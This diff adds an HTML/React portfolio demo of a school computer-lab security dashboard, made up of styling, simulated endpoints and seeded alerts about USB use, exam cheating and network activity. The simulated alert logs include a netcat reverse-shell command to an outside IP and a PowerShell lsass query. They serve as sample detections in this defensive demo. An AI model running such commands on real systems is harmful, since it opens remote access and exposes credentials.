@@ -1,0 +1,1615 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>SOC Platform — Live Lab Demo</title>
+  <meta name="description" content="Cybersecurity SOC Platform for Computer Labs — Interactive Portfolio Demo.">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
+
+  <!-- React 18 & Babel for standalone browser execution -->
+  <script crossorigin src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
+  <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
+  <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+
+  <style>
+    /* ─── Design Tokens (Dark Cybersecurity Theme) ─────────────────── */
+    :root {
+      --bg:           #0d1117;
+      --bg-surface:   #161b22;
+      --bg-surface-2: #1c2230;
+      --bg-hover:     #21262d;
+      --border:       #30363d;
+      --border-2:     #3d444d;
+      --text:         #e6edf3;
+      --text-2:       #8d96a0;
+      --text-3:       #545d68;
+
+      --critical:    #f85149;
+      --critical-bg: rgba(248,81,73,.12);
+      --critical-br: rgba(248,81,73,.3);
+      --high:        #e08d3c;
+      --high-bg:     rgba(224,141,60,.12);
+      --high-br:     rgba(224,141,60,.3);
+      --medium:      #d29922;
+      --medium-bg:   rgba(210,153,34,.12);
+      --medium-br:   rgba(210,153,34,.3);
+      --low:         #3fb950;
+      --low-bg:      rgba(63,185,80,.12);
+      --low-br:      rgba(63,185,80,.3);
+      --online:      #3fb950;
+      --offline:     #545d68;
+
+      --accent:      #58a6ff;
+      --accent-bg:   rgba(88,166,255,.12);
+      --accent-br:   rgba(88,166,255,.25);
+
+      --radius-sm: 8px;
+      --radius:    12px;
+      --shadow-sm: 0 1px 3px rgba(0,0,0,.3);
+      --shadow:    0 4px 16px rgba(0,0,0,.4);
+      --shadow-lg: 0 8px 32px rgba(0,0,0,.55);
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'Inter', -apple-system, sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      min-height: 100vh;
+      line-height: 1.6;
+      font-size: 15px;
+      overflow-x: hidden;
+    }
+
+    /* ─── Top Portfolio Ribbon ────────────────────────────────────── */
+    .portfolio-ribbon {
+      background: linear-gradient(90deg, #1e3a8a 0%, #1e293b 100%);
+      border-bottom: 1px solid rgba(59,130,246,0.3);
+      padding: 6px 24px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      font-size: 12px;
+      color: #bfdbfe;
+      z-index: 101;
+    }
+    .ribbon-tag {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      font-weight: 600;
+    }
+    .ribbon-links {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+    }
+    .ribbon-link {
+      color: #93c5fd;
+      text-decoration: none;
+      display: inline-flex;
+      align-items: center;
+      gap: 4px;
+      font-weight: 500;
+      transition: color 0.15s;
+    }
+    .ribbon-link:hover {
+      color: #ffffff;
+      text-decoration: underline;
+    }
+
+    /* ─── Header ──────────────────────────────────────────────────── */
+    .header {
+      background: var(--bg-surface);
+      border-bottom: 1px solid var(--border);
+      padding: 0 32px;
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      height: 62px;
+      position: sticky;
+      top: 0;
+      z-index: 100;
+      box-shadow: var(--shadow-sm);
+    }
+    .logo-icon {
+      width: 36px; height: 36px;
+      background: linear-gradient(135deg, #1f6feb, #388bfd);
+      border-radius: 10px;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 18px; flex-shrink: 0;
+      box-shadow: 0 2px 8px rgba(31,111,235,.4);
+    }
+    .header-title    { font-size: 17px; font-weight: 700; color: var(--text); letter-spacing: -.3px; }
+    .header-subtitle { font-size: 12px; color: var(--text-3); margin-top: 1px; }
+    .header-spacer   { flex: 1; }
+    .refresh-pill {
+      display: flex; align-items: center; gap: 6px;
+      font-size: 12px; color: var(--text-2);
+      padding: 5px 12px;
+      background: var(--bg-surface-2);
+      border: 1px solid var(--border);
+      border-radius: 20px;
+    }
+    .teacher-pill {
+      display: flex; align-items: center; gap: 6px;
+      font-size: 12px; color: var(--text);
+      padding: 5px 12px;
+      background: var(--accent-bg);
+      border: 1px solid var(--accent-br);
+      border-radius: 20px;
+    }
+    .live-dot {
+      width: 7px; height: 7px; border-radius: 50%;
+      background: var(--online);
+      animation: blink 2.2s ease infinite;
+    }
+    @keyframes blink { 0%,100%{opacity:1} 50%{opacity:.25} }
+
+    /* ─── Summary Bar ─────────────────────────────────────────────── */
+    .summary-bar {
+      background: linear-gradient(90deg, #1f2d45 0%, #162032 100%);
+      border-bottom: 1px solid var(--border);
+      padding: 14px 32px;
+      display: flex; align-items: center; gap: 28px;
+    }
+    .sum-item { display: flex; align-items: center; gap: 10px; }
+    .sum-icon { font-size: 18px; width: 20px; display:flex; align-items:center; justify-content:center; }
+    .sum-value { font-size: 22px; font-weight: 700; color: var(--text); line-height: 1; }
+    .sum-label { font-size: 11px; color: var(--text-2); margin-top: 2px; letter-spacing: .2px; }
+    .sum-sep   { width: 1px; height: 36px; background: var(--border); }
+
+    /* ─── Main Layout ─────────────────────────────────────────────── */
+    main {
+      padding: 24px 32px;
+      max-width: 1600px;
+      margin: 0 auto;
+      display: grid;
+      grid-template-columns: 1fr 290px;
+      gap: 22px;
+    }
+    .col-left  { display: flex; flex-direction: column; gap: 18px; }
+    .col-right { display: flex; flex-direction: column; gap: 18px; }
+
+    /* ─── Card ────────────────────────────────────────────────────── */
+    .card {
+      background: var(--bg-surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      box-shadow: var(--shadow-sm);
+    }
+    .card-header {
+      padding: 16px 20px;
+      border-bottom: 1px solid var(--border);
+      display: flex; align-items: center; justify-content: space-between; gap: 12px;
+    }
+    .card-title {
+      font-size: 14px; font-weight: 600; color: var(--text);
+      display: flex; align-items: center; gap: 8px;
+    }
+    .card-count { font-size: 12px; color: var(--text-3); }
+
+    /* ─── Severity Stat Cards ─────────────────────────────────────── */
+    .stat-grid {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 12px;
+    }
+    .stat-card {
+      background: var(--bg-surface);
+      border: 1.5px solid var(--border);
+      border-radius: var(--radius);
+      padding: 18px 16px;
+      cursor: pointer;
+      transition: all .18s ease;
+      box-shadow: var(--shadow-sm);
+      position: relative;
+      overflow: hidden;
+    }
+    .stat-card::before {
+      content: '';
+      position: absolute;
+      top: 0; left: 0; right: 0;
+      height: 3px;
+      transition: opacity .18s;
+      opacity: 0;
+    }
+    .stat-card:hover { background: var(--bg-hover); border-color: var(--border-2); transform: translateY(-2px); box-shadow: var(--shadow); }
+    .stat-card.active-filter { border-color: var(--border-2); }
+    .stat-card.active-filter::before { opacity: 1; }
+    .stat-label   { font-size: 11px; font-weight: 600; text-transform: uppercase; letter-spacing: .6px; margin-bottom: 10px; }
+    .stat-value   { font-size: 38px; font-weight: 700; line-height: 1; }
+    .stat-desc    { font-size: 11px; color: var(--text-3); margin-top: 6px; }
+
+    .stat-card.CRITICAL { border-color: var(--critical-br); }
+    .stat-card.CRITICAL::before { background: var(--critical); }
+    .stat-card.CRITICAL .stat-label { color: var(--critical); }
+    .stat-card.CRITICAL .stat-value { color: var(--critical); }
+    .stat-card.HIGH { border-color: var(--high-br); }
+    .stat-card.HIGH::before { background: var(--high); }
+    .stat-card.HIGH .stat-label { color: var(--high); }
+    .stat-card.HIGH .stat-value { color: var(--high); }
+    .stat-card.MEDIUM { border-color: var(--medium-br); }
+    .stat-card.MEDIUM::before { background: var(--medium); }
+    .stat-card.MEDIUM .stat-label { color: var(--medium); }
+    .stat-card.MEDIUM .stat-value { color: var(--medium); }
+    .stat-card.LOW { border-color: var(--low-br); }
+    .stat-card.LOW::before { background: var(--low); }
+    .stat-card.LOW .stat-label { color: var(--low); }
+    .stat-card.LOW .stat-value { color: var(--low); }
+
+    /* ─── Toolbar ─────────────────────────────────────────────────── */
+    .toolbar { display: flex; align-items: center; gap: 10px; flex-wrap: wrap; }
+    .tab-group {
+      display: flex;
+      background: var(--bg-surface-2);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-sm);
+      padding: 3px; gap: 2px;
+    }
+    .tab-btn {
+      background: transparent;
+      border: none;
+      color: var(--text-2);
+      padding: 6px 14px;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 13px; font-weight: 500; font-family: inherit;
+      transition: all .15s;
+      white-space: nowrap;
+    }
+    .tab-btn:hover { background: var(--bg-hover); color: var(--text); }
+    .tab-btn.active {
+      background: var(--bg-surface);
+      color: var(--accent);
+      box-shadow: var(--shadow-sm);
+      font-weight: 600;
+      border: 1px solid var(--border);
+    }
+    .toolbar-spacer { flex: 1; }
+    .search-input, .date-input {
+      padding: 7px 13px;
+      border: 1px solid var(--border);
+      border-radius: var(--radius-sm);
+      font-size: 13px; font-family: inherit;
+      background: var(--bg-surface);
+      color: var(--text);
+      outline: none;
+      transition: border-color .15s;
+    }
+    .search-input:focus, .date-input:focus {
+      border-color: var(--accent);
+      box-shadow: 0 0 0 3px var(--accent-bg);
+    }
+    .search-input::placeholder { color: var(--text-3); }
+    .search-input { width: 230px; }
+    .date-input   { color-scheme: dark; }
+
+    /* ─── Alert Table ─────────────────────────────────────────────── */
+    .alert-feed-card {
+      display: flex;
+      flex-direction: column;
+      min-height: 0;
+    }
+    .alert-list {
+      overflow-x: auto;
+      overflow-y: auto;
+      -webkit-overflow-scrolling: touch;
+      max-height: 600px;
+      min-height: 320px;
+    }
+    table { width: 100%; border-collapse: collapse; }
+    thead th {
+      background: var(--bg-surface-2);
+      padding: 10px 16px;
+      font-size: 11px; font-weight: 600; color: var(--text-3);
+      text-transform: uppercase; letter-spacing: .5px;
+      border-bottom: 1px solid var(--border);
+      position: sticky; top: 0; z-index: 2;
+      white-space: nowrap;
+      text-align: left;
+    }
+    tbody td {
+      padding: 12px 16px;
+      border-bottom: 1px solid var(--border);
+      font-size: 13px; vertical-align: middle;
+    }
+    .alert-row { cursor: pointer; transition: background .12s; }
+    .alert-row:hover td { background: var(--bg-hover); }
+
+    /* ─── Severity Badges ─────────────────────────────────────────── */
+    .sev-badge {
+      display: inline-flex; align-items: center; gap: 5px;
+      padding: 3px 9px;
+      border-radius: 20px;
+      font-size: 11px; font-weight: 600; letter-spacing: .3px;
+      white-space: nowrap;
+    }
+    .sev-badge::before {
+      content: ''; display: block;
+      width: 6px; height: 6px; border-radius: 50%; flex-shrink: 0;
+    }
+    .sev-badge.CRITICAL { background: var(--critical-bg); color: var(--critical); border: 1px solid var(--critical-br); }
+    .sev-badge.CRITICAL::before { background: var(--critical); }
+    .sev-badge.HIGH     { background: var(--high-bg);     color: var(--high);     border: 1px solid var(--high-br); }
+    .sev-badge.HIGH::before     { background: var(--high); }
+    .sev-badge.MEDIUM   { background: var(--medium-bg);   color: var(--medium);   border: 1px solid var(--medium-br); }
+    .sev-badge.MEDIUM::before   { background: var(--medium); }
+    .sev-badge.LOW      { background: var(--low-bg);      color: var(--low);      border: 1px solid var(--low-br); }
+    .sev-badge.LOW::before      { background: var(--low); }
+
+    /* ─── Source Badge ────────────────────────────────────────────── */
+    .src-badge {
+      display: inline-flex; align-items: center; gap: 5px;
+      padding: 2px 8px;
+      border-radius: 4px;
+      font-size: 11px; font-weight: 500;
+      background: var(--bg-surface-2);
+      border: 1px solid var(--border);
+      color: var(--text-2);
+      white-space: nowrap;
+    }
+
+    /* ─── Action Buttons ──────────────────────────────────────────── */
+    .row-actions {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      flex-wrap: wrap;
+    }
+    .ack-btn {
+      background: var(--accent-bg);
+      border: 1px solid var(--accent-br);
+      color: var(--accent);
+      padding: 5px 12px;
+      border-radius: var(--radius-sm);
+      cursor: pointer;
+      font-size: 12px; font-weight: 600; font-family: inherit;
+      transition: all .15s;
+      white-space: nowrap;
+      display: inline-flex;
+      align-items: center;
+      gap: 4px;
+    }
+    .ack-btn:hover {
+      background: var(--accent);
+      color: #fff;
+      box-shadow: 0 2px 8px rgba(88,166,255,.35);
+      transform: translateY(-1px);
+    }
+    .terminate-btn {
+      background: var(--critical-bg);
+      border: 1px solid var(--critical-br);
+      color: var(--critical);
+      padding: 5px 12px;
+      border-radius: var(--radius-sm);
+      cursor: pointer;
+      font-size: 12px; font-weight: 600; font-family: inherit;
+      transition: all .15s;
+      white-space: nowrap;
+      display: inline-flex;
+      align-items: center;
+      gap: 4px;
+    }
+    .terminate-btn:hover:not(:disabled) {
+      background: var(--critical);
+      color: #fff;
+      box-shadow: 0 2px 8px rgba(248,81,73,.3);
+      transform: translateY(-1px);
+    }
+    .terminate-btn:disabled {
+      opacity: .55;
+      cursor: not-allowed;
+    }
+
+    /* ─── Detail Drawer / Expanded Row ────────────────────────────── */
+    .expand-chevron { font-size: 11px; color: var(--text-3); transition: transform .2s; display: inline-block; }
+    .expand-chevron.open { transform: rotate(180deg); }
+
+    .detail-row td {
+      padding: 0 !important;
+      background: var(--bg) !important;
+      border-bottom: 1px solid var(--border);
+    }
+    .detail-grid {
+      padding: 16px 20px;
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+      gap: 10px;
+    }
+    .detail-field {
+      display: flex; align-items: flex-start; gap: 10px;
+      padding: 10px 12px;
+      background: var(--bg-surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-sm);
+    }
+    .detail-icon { font-size: 14px; width: 16px; flex-shrink: 0; margin-top: 2px; color: var(--text-2); }
+    .detail-key  { font-size: 11px; color: var(--text-3); font-weight: 500; margin-bottom: 3px; text-transform: uppercase; letter-spacing: .3px; }
+    .detail-val  { font-size: 13px; color: var(--text); font-weight: 500; word-break: break-word; line-height: 1.4; }
+
+    /* ─── Right Column & Machine Cards ────────────────────────────── */
+    .agents-grid { display: flex; flex-direction: column; gap: 8px; padding: 12px; }
+    .agent-card {
+      background: var(--bg-surface-2);
+      border: 1.5px solid var(--border);
+      border-radius: var(--radius-sm);
+      padding: 12px 14px;
+      cursor: pointer;
+      transition: all .15s;
+    }
+    .agent-card:hover { border-color: var(--border-2); background: var(--bg-hover); }
+    .agent-card.selected { border-color: var(--accent); background: var(--accent-bg); }
+    .agent-card-top { display: flex; align-items: center; gap: 9px; margin-bottom: 4px; }
+    .status-dot {
+      width: 8px; height: 8px; border-radius: 50%; flex-shrink: 0;
+    }
+    .status-dot.online  { background: var(--online); box-shadow: 0 0 0 3px rgba(63,185,80,.25); }
+    .status-dot.offline { background: var(--offline); }
+    .agent-hostname  { font-size: 13px; font-weight: 600; color: var(--text); flex: 1; }
+    .status-label-badge {
+      font-size: 10px; font-weight: 600;
+      padding: 1px 7px; border-radius: 20px;
+    }
+    .status-label-badge.online  { background: var(--low-bg);  color: var(--online);  border: 1px solid var(--low-br); }
+    .agent-last-seen { font-size: 11px; color: var(--text-3); }
+    .agent-controls {
+      margin-top: 8px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+    .agent-control-select {
+      flex: 1;
+      min-width: 0;
+      background: var(--bg-surface);
+      color: var(--text);
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      padding: 5px 8px;
+      font-size: 11px;
+      font-family: inherit;
+    }
+    .agent-control-btn {
+      background: var(--critical-bg);
+      color: var(--critical);
+      border: 1px solid var(--critical-br);
+      border-radius: 6px;
+      padding: 5px 10px;
+      font-size: 11px;
+      font-weight: 600;
+      font-family: inherit;
+      cursor: pointer;
+      white-space: nowrap;
+    }
+    .agent-control-btn:hover:not(:disabled) {
+      background: var(--critical);
+      color: #fff;
+    }
+
+    /* ─── Bottom AI Insights ──────────────────────────────────────── */
+    .bottom-ai {
+      max-width: 1600px;
+      margin: 0 auto;
+      padding: 0 32px 32px;
+    }
+    .chatbot-card { padding: 18px 20px; }
+    .chatbot-head {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 10px;
+      margin-bottom: 12px;
+      flex-wrap: wrap;
+    }
+    .chatbot-controls { display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
+    .chatbot-select {
+      background: var(--bg-surface-2);
+      color: var(--text);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 6px 10px;
+      font-size: 12px;
+    }
+    .chatbot-ask-row {
+      margin-top: 10px;
+      display: grid;
+      grid-template-columns: 1fr auto;
+      gap: 8px;
+    }
+    .chatbot-input {
+      background: var(--bg-surface-2);
+      color: var(--text);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 8px 12px;
+      font-size: 13px;
+      width: 100%;
+      outline: none;
+    }
+    .chatbot-input:focus {
+      border-color: var(--accent);
+      box-shadow: 0 0 0 3px var(--accent-bg);
+    }
+    .chatbot-quick {
+      margin-top: 10px;
+      display: flex;
+      gap: 8px;
+      flex-wrap: wrap;
+    }
+    .quick-chip {
+      background: var(--bg-surface-2);
+      border: 1px solid var(--border);
+      color: var(--text-2);
+      padding: 5px 12px;
+      border-radius: 20px;
+      cursor: pointer;
+      font-size: 12px;
+      transition: all 0.15s;
+    }
+    .quick-chip:hover {
+      background: var(--bg-hover);
+      color: var(--accent);
+      border-color: var(--accent-br);
+    }
+    .chatbot-answer-box {
+      margin-top: 14px;
+      background: var(--bg-surface-2);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 14px 16px;
+      animation: fadeIn 0.2s ease;
+    }
+    .chatbot-answer-title {
+      font-size: 11px;
+      color: var(--text-3);
+      text-transform: uppercase;
+      letter-spacing: .5px;
+      margin-bottom: 6px;
+      font-weight: 600;
+    }
+    .chatbot-answer-text {
+      font-size: 14px;
+      color: var(--text);
+      line-height: 1.55;
+    }
+    .chatbot-cards-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
+      gap: 10px;
+      margin-top: 12px;
+    }
+    .insight-card {
+      background: var(--bg-surface);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 12px;
+      font-size: 12px;
+    }
+
+    /* ─── Toast Notifications ─────────────────────────────────────── */
+    .toast-wrapper {
+      position: fixed; top: 76px; right: 22px;
+      z-index: 9999;
+      display: flex; flex-direction: column; gap: 10px;
+      width: 350px; pointer-events: none;
+    }
+    .toast {
+      background: var(--bg-surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 14px 16px;
+      box-shadow: var(--shadow-lg);
+      pointer-events: all;
+      cursor: pointer;
+      border-left: 4px solid transparent;
+      animation: toastSlide .3s cubic-bezier(.4,0,.2,1);
+    }
+    .toast.CRITICAL { border-left-color: var(--critical); }
+    .toast.HIGH     { border-left-color: var(--high); }
+    .toast.SUCCESS  { border-left-color: var(--low); }
+    .toast-top { display: flex; align-items: center; gap: 8px; margin-bottom: 6px; }
+    .toast-level {
+      font-size: 10px; font-weight: 700;
+      text-transform: uppercase; letter-spacing: .5px;
+      padding: 2px 7px; border-radius: 20px;
+    }
+    .toast-level.CRITICAL { background: var(--critical-bg); color: var(--critical); border: 1px solid var(--critical-br); }
+    .toast-level.HIGH     { background: var(--high-bg);     color: var(--high);     border: 1px solid var(--high-br); }
+    .toast-level.SUCCESS  { background: var(--low-bg);      color: var(--low);      border: 1px solid var(--low-br); }
+    .toast-machine { font-size: 12px; color: var(--text-2); font-weight: 500; }
+    .toast-close   { margin-left: auto; font-size: 14px; color: var(--text-3); }
+    .toast-body { font-size: 13px; color: var(--text); line-height: 1.45; font-weight: 500; }
+    .toast-time { font-size: 11px; color: var(--text-3); margin-top: 4px; }
+
+    @keyframes toastSlide {
+      from { transform: translateX(50px); opacity: 0; }
+      to   { transform: translateX(0);    opacity: 1; }
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(4px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+
+    /* ─── Modal (Report Card / Inspection) ────────────────────────── */
+    .modal-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.7);
+      backdrop-filter: blur(4px);
+      z-index: 1000;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+    .modal-content {
+      background: var(--bg-surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      max-width: 680px;
+      width: 100%;
+      max-height: 85vh;
+      overflow-y: auto;
+      padding: 24px;
+      box-shadow: var(--shadow-lg);
+    }
+
+    /* ─── Responsive Media Queries ────────────────────────────────── */
+    @media (max-width: 1024px) {
+      main { grid-template-columns: 1fr; padding: 18px 20px; }
+      .summary-bar { flex-wrap: wrap; padding: 12px 20px; gap: 18px; }
+      .header { padding: 10px 20px; height: auto; flex-wrap: wrap; gap: 10px; }
+      .stat-grid { grid-template-columns: repeat(2, 1fr); }
+      .bottom-ai { padding: 0 20px 28px; }
+    }
+    @media (max-width: 640px) {
+      main { padding: 14px; gap: 14px; }
+      .header { padding: 10px 14px; }
+      .header-spacer { display: none; }
+      .stat-grid { grid-template-columns: 1fr; }
+      .summary-bar { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; padding: 12px 14px; }
+      .sum-sep { display: none; }
+      .portfolio-ribbon { padding: 8px 14px; flex-direction: column; gap: 6px; align-items: flex-start; }
+      .ribbon-tag, .ribbon-links { flex-wrap: wrap; gap: 8px; }
+      .card-header { padding: 12px 14px; flex-wrap: wrap; }
+      .search-input { width: 100%; }
+      .tab-group { width: 100%; overflow-x: auto; -webkit-overflow-scrolling: touch; }
+      .bottom-ai { padding: 0 14px 24px; }
+      .chatbot-ask-row { grid-template-columns: 1fr; }
+      .chatbot-cards-grid { grid-template-columns: 1fr; }
+      .toast-wrapper { left: 12px; right: 12px; width: auto; top: 12px; }
+      .modal-content { padding: 16px; max-height: 90vh; }
+    }
+  </style>
+</head>
+<body>
+  <div id="root"></div>
+
+<script type="text/babel">
+  const { useState, useEffect, useRef, useMemo, useCallback } = React;
+
+  /* ─────────────────────────────────────────────────────────────
+   * INITIAL SEED DATA (Realistic Endpoint Monitoring)
+   * ───────────────────────────────────────────────────────────── */
+  const INITIAL_AGENTS = [
+    { agent_id: 'demo-ubuntu-01', hostname: 'lab-pc-01', os: 'Ubuntu 22.04 LTS', last_seen: Math.floor(Date.now() / 1000) - 4 },
+    { agent_id: 'demo-macos-02',  hostname: 'lab-pc-02', os: 'macOS Sonoma 14.4', last_seen: Math.floor(Date.now() / 1000) - 2 },
+    { agent_id: 'demo-win-desk',  hostname: 'teacher-desk', os: 'Windows 11 Pro', last_seen: Math.floor(Date.now() / 1000) - 1 },
+  ];
+
+  const TERMINATE_TARGETS = [
+    { value: 'terminal', label: 'Terminal / Shell' },
+    { value: 'chrome',   label: 'Chrome / Chromium' },
+    { value: 'firefox',  label: 'Firefox' },
+    { value: 'brave',    label: 'Brave Browser' },
+  ];
+
+  const INITIAL_ALERTS = [
+    {
+      id: 101,
+      rule_id: 'USB-001',
+      rule_name: 'Unauthorized USB/pendrive attached',
+      severity: 'CRITICAL',
+      agent_id: 'demo-ubuntu-01',
+      hostname: 'lab-pc-01',
+      matched_log: '[USB Device Connected: Kingston DataTraveler 3.0 (ID: USB\\VID_0951&PID_1666) User: student01 Mount: /media/student01/KINGSTON]',
+      timestamp: Math.floor(Date.now() / 1000) - 65,
+      acknowledged: false,
+    },
+    {
+      id: 102,
+      rule_id: 'ACA-001',
+      rule_name: 'Restricted website detected',
+      severity: 'HIGH',
+      agent_id: 'demo-macos-02',
+      hostname: 'lab-pc-02',
+      matched_log: '[2026-10-13T19:30:12] Browser=brave Domain="chatgpt.com" URL="https://chatgpt.com/" Title="ChatGPT - Exam Assistance" Activity="BROWSER_BLOCKED"',
+      timestamp: Math.floor(Date.now() / 1000) - 140,
+      acknowledged: false,
+    },
+    {
+      id: 103,
+      rule_id: 'SEC-004',
+      rule_name: 'Port scanning tool executed',
+      severity: 'HIGH',
+      agent_id: 'demo-ubuntu-01',
+      hostname: 'lab-pc-01',
+      matched_log: '[PORT_SCAN] nmap -sV -p 1-65535 192.168.1.1 executed by user=student01 PID: 4908 Tool: nmap',
+      timestamp: Math.floor(Date.now() / 1000) - 210,
+      acknowledged: false,
+    },
+    {
+      id: 104,
+      rule_id: 'MAC-005',
+      rule_name: 'Screenshot activity detected',
+      severity: 'HIGH',
+      agent_id: 'demo-macos-02',
+      hostname: 'lab-pc-02',
+      matched_log: '[SCREENSHOT_TAKEN] Tool=gnome-screenshot File=/home/student02/Pictures/exam_q3.png User=student02 Method=PRINTSCREEN',
+      timestamp: Math.floor(Date.now() / 1000) - 340,
+      acknowledged: false,
+    },
+    {
+      id: 105,
+      rule_id: 'APP-006',
+      rule_name: 'Command prompt / PowerShell opened',
+      severity: 'MEDIUM',
+      agent_id: 'demo-win-desk',
+      hostname: 'teacher-desk',
+      matched_log: 'PowerShell: Get-Process -Name lsass | Select-Object -Property Id, ProcessName User: teacher01 Cmdline="pwsh.exe -ExecutionPolicy Bypass"',
+      timestamp: Math.floor(Date.now() / 1000) - 520,
+      acknowledged: false,
+    },
+    {
+      id: 106,
+      rule_id: 'MAC-002',
+      rule_name: 'Browser visit captured',
+      severity: 'LOW',
+      agent_id: 'demo-win-desk',
+      hostname: 'teacher-desk',
+      matched_log: '[2026-10-13T19:20:00] Browser=chrome Domain="docs.python.org" URL="https://docs.python.org/3/" Title="Python 3.12 Documentation"',
+      timestamp: Math.floor(Date.now() / 1000) - 680,
+      acknowledged: false,
+    },
+  ];
+
+  /* ─────────────────────────────────────────────────────────────
+   * POOL OF PERIODIC SIMULATED INCIDENTS (Every 15-20s)
+   * ───────────────────────────────────────────────────────────── */
+  const INCIDENT_STREAM_POOL = [
+    {
+      rule_id: 'SEC-001',
+      rule_name: 'Unauthorized reverse shell attempted',
+      severity: 'CRITICAL',
+      agent_id: 'demo-ubuntu-01',
+      hostname: 'lab-pc-01',
+      log: '[SEC_ALERT] REVERSE_SHELL_ATTEMPT user=student01 cmd="nc -e /bin/sh 203.0.113.42 4444" PID: 8122 severity=CRITICAL',
+    },
+    {
+      rule_id: 'WEB-001',
+      rule_name: 'Online gaming portal accessed',
+      severity: 'HIGH',
+      agent_id: 'demo-macos-02',
+      hostname: 'lab-pc-02',
+      log: '[BROWSER] Browser=brave Domain="poki.com" URL="https://poki.com/en/g/subway-surfers" Title="Poki Games - Free Online Gaming" user=student02',
+    },
+    {
+      rule_id: 'AUTH-001',
+      rule_name: 'Multiple failed sudo attempts (Brute Force)',
+      severity: 'HIGH',
+      agent_id: 'demo-ubuntu-01',
+      hostname: 'lab-pc-01',
+      log: '[FAILED_LOGIN_SPAM] sudo: 6 incorrect password attempts user=student01 BRUTE_FORCE severity=HIGH PID: 3412',
+    },
+    {
+      rule_id: 'ACA-001',
+      rule_name: 'AI coding assistant queried during exam',
+      severity: 'CRITICAL',
+      agent_id: 'demo-macos-02',
+      hostname: 'lab-pc-02',
+      log: '[BROWSER] Browser=chrome Domain="chatgpt.com" URL="https://chatgpt.com/c/6789a" Title="ChatGPT - Solve Lab Task 4" user=student02 Activity=BROWSER_BLOCKED',
+    },
+    {
+      rule_id: 'SEC-005',
+      rule_name: 'VPN tunnel client launched',
+      severity: 'CRITICAL',
+      agent_id: 'demo-ubuntu-01',
+      hostname: 'lab-pc-01',
+      log: '[PROCESS_START] name=openvpn PID: 5541 user=student01 cmd="openvpn --config unblock_lab.ovpn" severity=CRITICAL',
+    },
+    {
+      rule_id: 'NET-002',
+      rule_name: 'P2P / torrent client network traffic',
+      severity: 'HIGH',
+      agent_id: 'demo-macos-02',
+      hostname: 'lab-pc-02',
+      log: '[NETWORK_TRAFFIC] protocol=bittorrent remote_ip=185.71.21.90 port=6881 user=student02 TORRENT detected',
+    },
+    {
+      rule_id: 'STU-006',
+      rule_name: 'Screen capture during test',
+      severity: 'HIGH',
+      agent_id: 'demo-win-desk',
+      hostname: 'teacher-desk',
+      log: '[SCREENSHOT_TAKEN] Tool=SnippingTool.exe User=teacher01 File="C:\\Users\\teacher01\\Pictures\\exam.png" Method=SNIP_TOOL',
+    },
+  ];
+
+  /* ─────────────────────────────────────────────────────────────
+   * LOG PARSER & HELPERS
+   * ───────────────────────────────────────────────────────────── */
+  function fmtFull(ts) {
+    if (!ts) return '';
+    return new Date(ts * 1000).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+  }
+
+  function timeAgo(ts) {
+    const s = Math.floor(Date.now() / 1000 - ts);
+    if (s < 5)     return 'just now';
+    if (s < 60)    return `${s}s ago`;
+    if (s < 3600)  return `${Math.floor(s/60)}m ago`;
+    return `${Math.floor(s/3600)}h ago`;
+  }
+
+  function humaniseRule(name) {
+    if (!name) return '';
+    return name.replace(/_/g, ' ');
+  }
+
+  function detectSource(rawLog, ruleName) {
+    const text = `${rawLog || ''} ${ruleName || ''}`.toLowerCase();
+    if (text.includes('browser') || text.includes('url=') || text.includes('domain=')) return { icon: 'fa-globe', label: 'Browser' };
+    if (text.includes('powershell') || text.includes('terminal') || text.includes('cmd=') || text.includes('nmap')) return { icon: 'fa-terminal', label: 'Terminal' };
+    if (text.includes('usb')) return { icon: 'fa-plug', label: 'USB' };
+    if (text.includes('screenshot') || text.includes('snip')) return { icon: 'fa-camera', label: 'Screenshot' };
+    if (text.includes('process') || text.includes('vpn') || text.includes('pid:')) return { icon: 'fa-rocket', label: 'Process' };
+    if (text.includes('login') || text.includes('sudo') || text.includes('auth')) return { icon: 'fa-shield-halved', label: 'Auth' };
+    return { icon: 'fa-clipboard-list', label: 'Security' };
+  }
